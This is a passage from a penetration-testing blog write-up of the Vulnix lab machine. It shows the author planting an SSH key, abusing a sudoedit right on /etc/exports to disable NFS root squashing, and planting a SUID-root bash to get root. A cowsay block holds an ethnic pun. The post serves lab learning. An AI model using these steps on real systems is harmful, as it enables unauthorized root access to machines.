</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /tmp/vulnix.pub &gt; .ssh/authorized_keys
</span><span class='line'>$ cat .ssh/authorized_keys
</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuO5LOA1EIJeaFJHHic7NRNIUvOhBApq7CSu7PAM/THU4hngoZ4kglgFC9QdbsfQsRWLHsDmNcAAGLzIKwkLYXWYanBK/7xdmRmtGf0Sr32zZ4NaXP9B228fjUu5LSi42X/9HcfL9QdfXuB336OvXo43sDzLifrzoiBzlviZV55+uVd+/hI0GCRE3Yi9JrLs1A6NhuHq8xtRLJURhuGwoouA2tGZ+6fSr7t23bC1emBnyUiy2hu/4oS9tLvvptPv1Md9E+Ire6XMjZzCJufcSqiMVrVefnWv5j460TjHhKP7aq23nbzlxMqkZ8r9ovm5KW0UWWWyVPkOFSxPgFEaRr vulnix@kali</span></code></pre></td></tr></table></div></figure>


<p>And I was able to login with the key: <code>ssh -i /tmp/vulnix <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#x76;&#117;&#x6c;&#110;&#x69;&#x78;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#50;&#49;&#55;&#x2e;&#49;&#52;&#50;">&#118;&#117;&#x6c;&#x6e;&#105;&#120;&#x40;&#49;&#57;&#50;&#46;&#x31;&#54;&#x38;&#46;&#50;&#x31;&#55;&#46;&#49;&#52;&#x32;</a></code>. After some enumeration, I discovered that the vulnix user can edit <code>/etc/exports</code> with sudo privileges:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vulnix@vulnix:~$ sudo -l
</span><span class='line'>Matching 'Defaults' entries for vulnix on this host:
</span><span class='line'>    env_reset,
</span><span class='line'>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span><span class='line'>
</span><span class='line'>User vulnix may run the following commands on this host:
</span><span class='line'>    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports</span></code></pre></td></tr></table></div></figure>


<p>This is wonderful news. First of all, we need to disable <em>root_squash</em>. Then we can mount the root directory and read the flag, or we can leave a shell binary in vulnix&rsquo;s home directory, and run it later with root privileges. Let&rsquo;s do just that! I disabled root squashing with <code>/home/vulnix    *(rw,no_root_squash)</code>. Then I copied the bash executable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vulnix@vulnix:~$ cp /bin/bash /home/vulnix/
</span><span class='line'>vulnix@vulnix:~$ ls -l
</span><span class='line'>total 900
</span><span class='line'>-rwxr-xr-x 1 vulnix vulnix 920788 Jun 21 14:46 bash</span></code></pre></td></tr></table></div></figure>


<p>For the NFS configuration changes to take effect, I needed to make the NFS service to reload its configuration file or restart it, but I didn&rsquo;t have permissions to do that. So I rebooted the machine (but unmounted the share first). After rebooting, I mounted the share again, navigated to it as root with no problems, and changed permissions on the bash shell to make it SUID: <code>chmod 4777 bash</code> (I also copied it again as root).</p>

<p>From the SSH, I verified it as the vulnix user:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vulnix@vulnix:~$ ls -l bash
</span><span class='line'>-rwsrwxrwx 1 root root 920788 Jun 21 15:34 bash</span></code></pre></td></tr></table></div></figure>


<p>Finally, I ran the shell while preserving its permissions:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vulnix@vulnix:~$ ./bash -p
</span><span class='line'>bash-4.2# whoami
</span><span class='line'>root
</span><span class='line'>bash-4.2# cat /root/trophy.txt
</span><span class='line'>cc614640424f5bd60ce5d5264899c3be</span></code></pre></td></tr></table></div></figure>


<p>Not done yet, I cracked the MD5 hash to reveal the name of the l33t name of the author: Reb00tu53r. This was a fun one!</p>

<p><strong>Learn more</strong></p>

<ul>
<li><p><a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">NFSShell on Kali Linux</a></p></li>
<li><p><a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">Using nfsshell to compromise older environments</a></p></li>
<li><p><a href="http://www.techrepublic.com/article/working-with-nfs/">Working with NFS</a></p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ Q: What do you call a half-dozen    \
</span><span class='line'>| Indians with Asian flu? A: Six sick |
</span><span class='line'>\ Sikhs (sic).                        /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>

      








  


<time datetime="2017-06-20T08:04:29-04:00" pubdate data-updated="true">Jun 20<span>th</span>, 2017</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2017/06/19/enum4linux-kali-linux-tools/" title="Previous Post: enum4linux - Kali Linux tools">&laquo; enum4linux - Kali Linux tools</a>
      
      
        <a class="basic-alignment right" href="/blog/2017/06/24/sslscan-kali-linux-tools/" title="Next Post: sslscan - Kali Linux tools">sslscan - Kali Linux tools &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>whoami</h1>
  <p>switch (interests){<br>
 case INFORMATION SECURITY:<br>
Mostly offensive security, but trying to be well-rounded in everything;<br>
case PYTHON:<br>
Mainly security and sysadmin related scripting;<br>
case LINUX:<br>
Greetings from /dev/null;<br>
case JAPANESE:<br>
Language, anime, samurai;<br>
case MARTIAL ARTS:<br>
If it's fighting I like it;<br>
case MILITARY SCIENCE:<br>
Ancient, medieval, modern;<br>
default: GAMING;}</p>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2018/11/16/hackfest-2016-sedna/">Hackfest 2016: Sedna</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/11/11/social-engineering-expert-course-review/">Social Engineering Expert course review</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/11/10/take-the-spydersec-challenge/">Take the SpyderSec Challenge</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/10/26/all-your-64base-are-belong-to-us/">All your 64Base are belong to us</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can/">SkyDog Con CTF 2016 - Catch Me If You Can</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'chousensha',
            count: 5,
            skip_forks: true,
	    skip_repos: [ "chousensha.github.io" ],
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>


<section>
  <h1>Latest Tweets</h1>
  <ul id="tweets">
    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
  </ul>
  
    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
  
</section>

<section>
  <h1>Blogroll</h1>
  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
</section>

  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2018 - chousensha -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'coredumpoverflow';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix/';
        var disqus_url = 'http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
